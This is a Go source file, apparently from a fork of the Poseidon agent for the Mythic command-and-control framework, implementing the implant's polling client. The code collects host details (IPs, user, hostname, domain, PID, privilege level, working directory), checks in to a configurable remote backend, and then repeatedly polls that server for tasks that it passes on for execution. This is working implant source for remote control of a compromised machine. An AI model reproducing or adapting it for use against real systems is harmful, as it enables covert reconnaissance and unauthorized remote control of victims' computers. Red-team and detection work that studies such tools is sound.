package pollclient

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/tasks"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/functions"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
)

// Config defines how the polling client reaches your backend.
type Config struct {
	BaseURL     string
	CheckinPath string
	PollPath    string
	Interval    time.Duration
	HTTPClient  *http.Client
}

// Client polls a backend for tasking and forwards responses back.
type Client struct {
	cfg       Config
	agentID   string
	httpClient *http.Client
}

// New returns a client with defaults applied.
func New(cfg Config) *Client {
	client := cfg.HTTPClient
	if client == nil {
		client = &http.Client{Timeout: 30 * time.Second}
	}
	if cfg.Interval <= 0 {
		cfg.Interval = 5 * time.Second
	}
	return &Client{
		cfg:       cfg,
		httpClient: client,
	}
}

// Run performs a checkin then enters the poll loop until ctx is cancelled.
func (c *Client) Run(ctx context.Context) error {
	t := time.NewTicker(c.cfg.Interval)
	defer t.Stop()
	for {
		if c.agentID == "" {
			if err := c.checkin(ctx); err != nil {
				if !isUpstreamUnavailable(err) {
					log.Printf("checkin error: %v", err)
				}
			}
		} else {
			if err := c.pollOnce(ctx); err != nil && !isUpstreamUnavailable(err) {
				log.Printf("poll error: %v", err)
			}
		}

		select {
		case <-ctx.Done():
			return nil
		case <-t.C:
		}
	}
}

func (c *Client) checkin(ctx context.Context) error {
	msg := c.buildCheckin()
	body, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal checkin: %w", err)
	}
	url := c.joinPath(c.cfg.BaseURL, c.cfg.CheckinPath)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("build checkin request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("send checkin: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("checkin bad status %d: %s", resp.StatusCode, string(b))
	}
	var respBody map[string]interface{}
	if data, err := io.ReadAll(resp.Body); err == nil && len(data) > 0 {
		_ = json.Unmarshal(data, &respBody)
	}
	if id, ok := respBody["id"].(string); ok {
		c.agentID = id
	}
	return nil
}

func (c *Client) pollOnce(ctx context.Context) error {
	msg := responses.CreateMythicPollMessage()
	body, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal poll message: %w", err)
	}
	url := c.joinPath(c.cfg.BaseURL, c.cfg.PollPath)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("build poll request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	if c.agentID != "" {
		req.Header.Set("X-Agent-UUID", c.agentID)
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("send poll: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("poll bad status %d: %s", resp.StatusCode, string(b))
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read poll response: %w", err)
	}
	if len(data) == 0 {
		return nil
	}
	var parsed structs.MythicMessageResponse
	if err := json.Unmarshal(data, &parsed); err != nil {
		return fmt.Errorf("unmarshal poll response: %w", err)
	}
	tasks.HandleMessageFromMythic(parsed)
	return nil
}

func (c *Client) joinPath(base, path string) string {
	base = strings.TrimRight(base, "/")
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	return base + path
}

func (c *Client) buildCheckin() structs.CheckInMessage {
	checkin := structs.CheckInMessage{
		Action:       "checkin",
		IPs:          functions.GetCurrentIPAddress(),
		OS:           functions.GetOS(),
		User:         functions.GetUser(),
		Host:         functions.GetHostname(),
		Pid:          functions.GetPID(),
		UUID:         "", // no Mythic UUID; left blank intentionally
		Architecture: functions.GetArchitecture(),
		Domain:       functions.GetDomain(),
		ProcessName:  functions.GetProcessName(),
		SleepInfo:    "{}",
		Cwd:          functions.GetCwd(),
	}
	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}
	return checkin
}

// isUpstreamUnavailable reports whether an error indicates the UI backend
// could not be reached (connection refused, DNS failure, timeout, etc.).
func isUpstreamUnavailable(err error) bool {
	if err == nil {
		return false
	}
	if urlErr, ok := err.(*url.Error); ok && urlErr.Err != nil {
		err = urlErr.Err
	}
	var netErr net.Error
	if errors.As(err, &netErr) {
		return true
	}
	var opErr *net.OpError
	if errors.As(err, &opErr) {
		return true
	}
	var dnsErr *net.DNSError
	if errors.As(err, &dnsErr) {
		return true
	}
	return false
}

